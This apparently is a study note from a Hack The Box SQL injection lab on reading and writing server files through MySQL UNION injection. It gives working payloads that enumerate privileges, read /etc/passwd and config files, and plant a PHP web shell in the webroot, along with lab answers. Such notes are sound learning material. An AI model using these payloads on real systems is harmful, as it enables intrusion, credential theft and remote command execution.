# Read & Write Files

## Read File

### Privileges

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation

First, we have to determine which user we are within the database

If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do.&#x20;

**Find current DB user**

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

### **User Privileges**

Now that we know our user, we can start looking for what privileges we have with that user.

**Test super admin privileges**

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

_If we had many users within the DBMS_, we can add `WHERE user="root"` to only show privileges for our current user `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

**Dumping other privileges we have, directly from the schema**

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

_If we had many users within the DBMS_

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

### LOAD\_FILE

[LOAD\_FILE()](https://mariadb.com/kb/en/load\_file/) function can be used in MariaDB / MySQL to read data from files.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

> We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/load_file_sqli.png" alt=""><figcaption></figcaption></figure>

We were able to successfully read the contents of the passwd file through the SQL injection.

### Another Example

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/load_file_search.png" alt=""><figcaption></figcaption></figure>

### Assessment

We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- - 
```

dB\_pAssw0rd\_iS\_flag!

## Writing File

### Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secure\_file\_priv) variable is used to determine where to read/write files from

**find out the value of `secure_file_priv`**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

using a `UNION` injection, we have to get the value using a `SELECT` statement.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### SELECT INTO OUTFILE

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell-session
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```shell-session
cat /tmp/test.txt 

this is a test
```

```shell-session
ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

owned by the `mysql` user.

### Writing Files through SQL Injection

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_proof.png" alt=""><figcaption></figcaption></figure>

No error = query succeeded

**Checking for the file `proof.txt` in the webroot**

<figure><img src="https://academy.hackthebox.com/storage/modules/33/write_proof_text.png" alt=""><figcaption><p>http://SERVER_IP:PORT/proof.txt</p></figcaption></figure>

### Writing a Web Shell

We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

`http://SERVER_IP:PORT/shell.php?0=id`

### Assessment

Find the flag by using a webshell.

```
search.php?port_code=cn'+union+select+""%2C'<%3Fphp+system(%24_REQUEST[0])%3B+%3F>'%2C+""%2C+""+into+outfile+'%2Fvar%2Fwww%2Fhtml%2Fshell.php'--+-
```

<figure><img src="../../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>









